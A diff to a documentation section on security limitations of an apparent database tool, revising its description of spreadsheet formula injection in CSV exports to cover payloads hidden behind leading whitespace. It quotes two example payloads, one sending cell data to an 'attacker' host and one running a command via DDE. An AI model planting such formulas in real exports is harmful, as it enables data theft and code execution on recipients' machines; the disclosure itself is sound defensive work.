@@ -207,7 +207,9 @@ deterministic.
 4. **Encryption**: Does not enforce connection encryption (configurable separately)
 5. **Audit Logging**: Provides basic logging but not comprehensive audit trails
 6. **Spreadsheet Formula Injection in CSV Exports**: `export_table_csv` returns database values
-   verbatim. A value beginning with `=`, `+`, `-`, `@`, a tab or a carriage return is evaluated
+   verbatim. A value beginning with `=`, `+`, `-` or `@` — including one that only does so once
+   a leading tab, carriage return or line feed is stripped, which is how such a payload evades a
+   naive first-character filter — is evaluated
    as a **formula** rather than data when the CSV is opened in Excel, LibreOffice Calc or Google
    Sheets, so a stored `=HYPERLINK("http://attacker/?"&A1)` or `=cmd|'/c calc'!A1` executes in
    the recipient's spreadsheet. The value never has to be malicious in the database, only
